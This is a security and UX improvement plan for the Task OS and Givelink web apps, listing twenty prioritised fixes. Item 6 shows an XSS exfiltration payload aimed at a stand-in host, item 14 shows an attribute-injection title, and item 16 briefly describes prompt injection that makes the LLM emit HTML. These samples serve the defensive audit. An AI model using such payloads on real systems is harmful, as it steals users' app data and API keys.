# Givelink × Task OS — Improvement Plan

> Scanned: `index.html` (12,893 lines), `givelink.html` (1,755 lines), `sw.js`, `vercel.json`  
> Date: 2026-07-04

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. CSP blocks Google Fonts → every production user sees system fallback fonts

**What**: `vercel.json` sets `font-src 'self'` and `style-src 'self' 'unsafe-inline'` but `index.html` loads Inter from `fonts.googleapis.com` / `fonts.gstatic.com` — both blocked.

**Where**: `vercel.json:14`, `index.html:12-14`

**Why it matters**: Every visitor in production sees Times New Roman or Helvetica instead of Inter. The whole visual identity breaks. The only reason this isn't obvious in dev is that `file://` and `localhost` don't enforce CSP headers.

**Effort**: S

**Suggested fix**:
- Add `https://fonts.googleapis.com` to `style-src` and `https://fonts.gstatic.com` to `font-src` in `vercel.json`, **or**
- Self-host Inter: download the WOFF2 files, place in repo root, remove the `<link>` tags, add `@font-face` declarations inline in `<style>` — this also eliminates the external request and is CSP-safe
- Preferred: self-hosting (removes the Google Fonts CDN dependency entirely)

---

### 2. `syncToTaskOS()` reads non-existent localStorage keys → cross-app sync always fails

**What**: `givelink.html:1208-1215` reads `taskos_profiles` (multi-profile schema) and `taskos_data_<id>`, but Task OS writes its entire state to a single `taskos` key (`index.html:2099`). Neither key is ever set. Sync silently shows "No Task OS profile found" and exits.

**Where**: `givelink.html:1208-1249`, `index.html:2097-2099`

**Why it matters**: The "🔗 Sync to Task OS" button in the sprint bar is a core cross-product feature. It has never worked in any version. Done tasks don't sync back. New backlog items don't flow into Task OS.

**Effort**: M

**Suggested fix**:
- Replace the profile lookup with a direct read of the `taskos` key: `const tosData = JSON.parse(localStorage.getItem('taskos') || '{}');`
- Remove the `taskos_profiles` / `taskos_data_<id>` code paths entirely
- After mutating `tosData.tasks`, write back with `localStorage.setItem('taskos', JSON.stringify(tosData))`

---

### 3. `window.prompt()` blocked in iOS PWA mode → API key and CRM logs broken on iOS

**What**: `givelink.html:1261` uses `window.prompt()` for the API key fallback; `givelink.html:1431` uses it to log CRM activity notes. iOS Safari blocks `window.prompt()` (and `window.confirm()`, `window.alert()`) in standalone/PWA mode.

**Where**: `givelink.html:1261`, `givelink.html:1431`

**Why it matters**: Givelink's target users are likely mobile-first founders. On iOS when installed as a PWA, the API key can never be entered and CRM activity logging silently does nothing — two critical flows are dead.

**Effort**: S

**Suggested fix**:
- `callClaudeGL` key prompt (line 1261): check `localStorage.getItem('taskos')` for `claudeKey` field first (same object Task OS saves to), redirect to Task OS Settings if missing — never prompt inline
- CRM activity log (line 1431): open a small modal with a `<textarea>` (similar to the existing `tm` task modal pattern) instead of `window.prompt()`

---

### 4. `./icons/icon-192.png` 404 → push notifications show broken icon

**What**: Both `sw.js:38-39` and `index.html:9286` reference `./icons/icon-192.png`. The `icons/` directory does not exist in the repository.

**Where**: `sw.js:38,39`, `index.html:9286`

**Why it matters**: Every browser and push notification fires with a broken icon. On Android PWA the badge also shows broken. Small but visible on every notification event.

**Effort**: S

**Suggested fix**:
- Create `icons/icon-192.png` (or a `.svg`) — the existing `icon.svg` can be referenced directly
- Or update both paths to `./icon.svg` which already exists (supported in modern notification APIs)
- Also add `./icons/icon-192.png` to the SW `STATIC` cache array so it's available offline once created

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 5. Claude API key stored in Supabase sync payload → key leaks to cloud database

**What**: `S.claudeKey` is a field on the main state object `S` (`index.html:2036`). `sbPush()` serialises the entire `S` object and upserts it to Supabase (`index.html:8608-8610`). Every sync push writes the Anthropic API key to the database row in plain text.

**Where**: `index.html:2036`, `index.html:8506-8507`, `index.html:8608-8610`

**Why it matters**: If Supabase RLS is misconfigured (or the project is shared), the API key is exposed. Anthropic keys have billing consequences. The Readwise and Notion tokens (stored separately in localStorage, never in `S`) already demonstrate the right pattern exists.

**Effort**: M

**Suggested fix**:
- Remove `claudeKey` from the `S` state object (line 2036)
- Save/load it via `localStorage.setItem('taskos_claude_key', k)` — same approach as Readwise/Notion tokens
- Update `saveSettings()`, `openSettings()`, and `callClaude()` to use the separate key
- In `sbPush()`, explicitly strip any credential fields before upload: `const {claudeKey, ...safeS} = S; body=[{user_id:..., data:safeS, ...}]`

---

### 6. XSS: `t.title` and `g.title` injected unescaped into `innerHTML` in Weekly Review

**What**: The Weekly Review wizard's `renderWizPanel()` builds HTML by template-literal-interpolating raw `t.title` and `g.title` directly into `innerHTML` at three locations, bypassing the `esc()` function that exists and is used elsewhere.

**Where**: `index.html:2888` (completed tasks step), `index.html:2895` (backlog step), `index.html:2897` (goal progress step)

**Why it matters**: A task title like `<img src=x onerror="fetch('//evil.example/'+localStorage.getItem('taskos'))">` would exfiltrate the entire app state including the API key. With Supabase sync, a compromised remote dataset could inject this into any device.

**Effort**: S

**Suggested fix**:
- On line 2888: change `${t.title}` → `${esc(t.title)}`
- On line 2895: change `${t.title}` → `${esc(t.title)}`
- On line 2897: change `${g.title}` → `${esc(g.title)}`
- Also audit `index.html:2062` (`<option>` titles) and `index.html:9695` (AI briefing output injected via `body.innerHTML`) for the same pattern

---

### 7. `callClaudeGL()` in Givelink ignores HTTP errors → silent AI failures

**What**: `givelink.html:1264-1271` fetches the Claude API but never checks `res.ok`. A 401 (bad key), 429 (rate limit), or 500 returns an error JSON object. `data.content?.[0]?.text` is `undefined`, so the function returns `null` with no user feedback. Compare to `index.html:4141-4144` which does check `res.ok` and shows a meaningful toast.

**Where**: `givelink.html:1264-1271`

**Why it matters**: Users clicking "AI Sprint Planner" or "AI Retrospective" on bad API keys or when rate-limited see nothing — no spinner stopping, no error. They assume the app is broken.

**Effort**: S

**Suggested fix**:
```js
const res = await fetch('https://api.anthropic.com/v1/messages', {...});
if (!res.ok) {
  const err = await res.json().catch(() => ({}));
  const msg = res.status === 401 ? 'Invalid API key' :
               res.status === 429 ? 'Rate limit — wait a moment' :
               `AI error ${res.status}`;
  toast(msg); return null;
}
```

---

### 8. Givelink accent colour is Tailwind blue, not brand purple

**What**: `givelink.html:17` sets `--accent:#3b82f6` (blue-500). The Givelink brand palette is purple (`#6B3FA0` / `#5718CA`). Every button, active nav item, progress bar, sprint bar, and badge in Givelink renders in the wrong colour.

**Where**: `givelink.html:17-20`

**Why it matters**: Givelink is the public-facing product. Wrong brand colour signals inconsistency to potential nonprofit clients who might see a screenshot or demo.

**Effort**: M

**Suggested fix**:
- Update CSS variables: `--accent:#6B3FA0` (or `#5718CA` for more vibrant), derive hover and soft variants
- Derive accent-soft: `rgba(107,63,160,.15)` — replaces the current blue tints on badges and pill borders
- Keep existing pillar colours (`--gr`, `--np`, `--pr`, etc.) as-is — they're semantic, not brand
- Check the "no pink on purple" rule: `--pr:#f472b6` (Product pillar) sits next to purple accent — consider using `#a78bfa` (existing `--op`) for Product instead

---

### 9. Readwise pagination URL reconstruction yields `undefined` when `data.next` lacks `?`

**What**: `index.html:8864` builds the next-page URL as `url = '/highlights/?' + data.next.split('?')[1]`. If `data.next` is ever a bare path without a query string, `.split('?')[1]` is `undefined`, producing `url = '/highlights/?undefined'` — a 400 error from the Readwise API.

**Where**: `index.html:8858-8865`

**Why it matters**: Readwise highlights pagination breaks on the second page for any book with 500+ highlights. The user sees a "Could not connect" toast and loses their highlight import halfway through.

**Effort**: S

**Suggested fix**:
```js
// Replace line 8864:
const nextUrl = new URL(data.next);
url = nextUrl.pathname.replace('/api/v2', '') + nextUrl.search;
```
Or simpler: pass the full URL directly to `_rwFetch` after stripping the base:
```js
url = data.next.replace('https://readwise.io/api/v2', '');
```

---

### 10. Givelink CRM view renders nothing until JS fires — no loading or empty state

**What**: `givelink.html:274` is `<div id="v-crm" class="view"></div>` — completely empty markup. `renderCRM()` is called only when the user navigates to the CRM view. On first load or a slow device, the view is blank white.

**Where**: `givelink.html:274`, `givelink.html:481` (`else if(v==='crm')renderCRM()`)

**Why it matters**: The CRM is how Panos tracks nonprofit relationships — likely opened daily. A blank flash on every visit feels broken and erodes trust in the tool.

**Effort**: S

**Suggested fix**:
- Add an inline skeleton or placeholder inside the div: `<div class="empty" style="padding:40px;">Loading CRM...</div>`
- Or, initialise `renderCRM()` during `init()` so the view is populated before the user ever navigates to it

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. 12,893-line monolithic `index.html` — zero testability, prohibitive navigation cost

**What**: The entire Task OS application — HTML, 11k lines of CSS, and all JS — lives in a single file. There's no module system, no separation of concerns, and no way to write unit tests.

**Where**: `index.html:1-12893`

**Why it matters**: Every feature addition requires grepping through thousands of minified lines. A typo anywhere breaks everything. Onboarding a second developer would take days. This is the primary multiplier on all other tech debt.

**Effort**: L

**Suggested fix**:
- Begin extracting feature modules into `<script type="module" src="js/...">` files alongside the HTML — start with the largest self-contained sections (Supabase sync ~100 lines, Readwise/Notion ~150 lines)
- Use a simple Vite or esbuild pipeline to bundle for prod — both support single-file output for offline-first PWA
- No need for a full framework; keep vanilla JS but split into `features/*.js` files

---

### 12. Notion integration always fails with CORS — no upfront warning

**What**: `index.html:8929-8955` — fetching from `https://api.notion.com` via browser always fails with CORS (Notion doesn't allow browser-direct calls). The code detects this post-hoc and shows a workaround message. But the UI shows a "Fetch from Notion" button with no caveat.

**Where**: `index.html:8916-8955`

**Why it matters**: Every user who tries this feature gets an error. The error explanation is clear, but the friction is avoidable — users waste time wondering if they misconfigured their token.

**Effort**: S

**Suggested fix**:
- Replace the "Fetch from Notion" button with inline instructions: "Notion doesn't allow direct browser access. Export your page as Markdown (··· → Export) and paste it below."
- Remove the `fetchFromNotion()` fetch attempt entirely — it will always fail
- Alternatively, proxy it via a Vercel serverless function (`/api/notion`) — this would make the integration actually work

---

### 13. Supabase sync errors surface only in the Settings panel status element

**What**: `index.html:8630` — sync errors update `_sbStatus` which is displayed in `#sb-status` inside the Settings modal. If the user hasn't opened Settings, they never see that sync has failed for hours.

**Where**: `index.html:8630`, `index.html:8638`

**Why it matters**: Users lose data across devices without knowing it. A sync failure discovered after days means potential data loss on the losing device.

**Effort**: S

**Suggested fix**:
- On `_sbScheduleSync` failure (line 8638), also call `toast('⚠ Sync failed: '+e.message, 5000)` — a 5-second toast is non-intrusive but noticed
- Add a persistent indicator in the sidebar bottom (e.g., a red dot on the sync icon) when the last sync was an error

---

### 14. Task titles unescaped in `<option>` elements — UI breaks for titles with `<`, `>`, `"`

**What**: `index.html:2062` builds the "blocked by" task selector: `t.title.slice(0,45)` is inserted directly as `<option>` text without `esc()`.

**Where**: `index.html:2062`

**Why it matters**: A task titled `"Fix <Login> bug"` renders broken in the select dropdown. A task titled `" onclick="evil()"` could interfere with surrounding attributes.

**Effort**: S

**Suggested fix**:
- Change `'+t.title.slice(0,45)+'` → `'+esc(t.title.slice(0,45))+'` on line 2062

---

### 15. Service worker cache key is a hardcoded date string — must be manually bumped per deploy

**What**: `sw.js:1` sets `const CACHE = 'task-os-20260530'`. When deploying updates, if the developer forgets to change this string, the old cache persists and users run stale code.

**Where**: `sw.js:1`

**Why it matters**: Stale PWA installs with outdated JS are notoriously hard to debug. A user might run a buggy version for weeks without knowing.

**Effort**: M

**Suggested fix**:
- If using a build pipeline: inject a content-hash at build time: `const CACHE = 'task-os-__CACHE_HASH__'`
- Without a build pipeline: use a `version.json` file at the repo root that bumps on every meaningful commit, and have the SW fetch it on activate to self-invalidate
- Short-term: at least document "bump `CACHE` in `sw.js` on every deploy" in `README.md`

---

### 16. `_renderAIBriefing` injects raw LLM output into `innerHTML`

**What**: `index.html:9701` — `body.innerHTML = lines.join('<br><br>')` where `lines` includes `d.PRIORITIES` (a sentence from Claude). If the LLM produces a string containing `<script>` or HTML tags, they render. The Claude system prompt doesn't explicitly prohibit HTML in the response.

**Where**: `index.html:9693-9701`

**Why it matters**: Prompt injection via a crafted task context (e.g., a task titled to influence the briefing prompt) could cause the LLM to return HTML that renders in the dashboard.

**Effort**: S

**Suggested fix**:
- Escape LLM text fields before insertion: `esc(d.PRIORITIES)`, `esc(d.RELATIONSHIP)`, `esc(d.WARNING)`
- Only allow `d.PRIORITY_1` to render as `<strong>` (already using `esc()` there — but double-check)
- Use `textContent` instead of `innerHTML` for plain-text fields, or at minimum strip tags: `d.PRIORITIES.replace(/<[^>]*>/g, '')`

---

## 💡 P3 — Nice to have

### 17. No `<noscript>` fallback — blank page with JS disabled

**What**: Both HTML files have no `<noscript>` element. With JS disabled or blocked (e.g., corporate proxy), the user sees a completely blank page.

**Where**: `index.html`, `givelink.html`

**Effort**: S

**Suggested fix**: Add `<noscript><div style="padding:40px;font-family:sans-serif;text-align:center;">Task OS requires JavaScript. Please enable it in your browser settings.</div></noscript>` inside `<body>`.

---

### 18. "More" mobile nav drawer (`#more-nav-modal`) has no ARIA focus trap

**What**: `index.html:8134-8200` — the "More" navigation bottom sheet opens without setting `aria-modal`, trapping focus, or returning focus to the trigger button on close. Screen reader users can tab outside the modal while it's open.

**Where**: `index.html:8134`, `index.html:273` (modal HTML at bottom of file)

**Effort**: M

**Suggested fix**:
- Add `role="dialog" aria-modal="true" aria-label="More navigation"` to the modal element
- Call the existing `_trapFocus()` function (already implemented at `index.html:3370-3387`) when opening `more-nav-modal` — it's used for other modals but not this one
- Return focus to the "More" bottom nav button on close

---

### 19. Givelink uses system font stack — looks inconsistent with Task OS on non-Apple devices

**What**: `givelink.html:21` uses `-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif`. Task OS loads Inter. On Windows/Android, Givelink renders in Segoe UI or Roboto while Task OS renders in Inter — feels like two different products.

**Where**: `givelink.html:21`

**Effort**: S

**Suggested fix**: Add Inter to `givelink.html` via the same `<link>` tags as `index.html` (once the CSP is fixed in P0 item 1), or self-host alongside the main app.

---

### 20. Dashboard stat cards flash empty numbers on first paint before `renderDash()` fires

**What**: The 5 stats cards (`.stats` grid) in `index.html:630+` render initially with `0` or blank values, then get filled by `renderDash()`. On a cold load there's a visible flash of "0 | 0 | 0 | 0 | 0" before real numbers appear.

**Where**: `index.html:630-660` (stats HTML), `index.html` (`renderDash()` function)

**Effort**: S

**Suggested fix**:
- Add a `.skel` CSS animation class (it already exists in the codebase — `index.html:2321` uses it for AI loading states) to the stat number elements as their initial state
- Replace with real values in `renderDash()` — the skeleton disappears naturally when content arrives

---

*Total: 4 P0 · 6 P1 · 6 P2 · 4 P3 = 20 items*
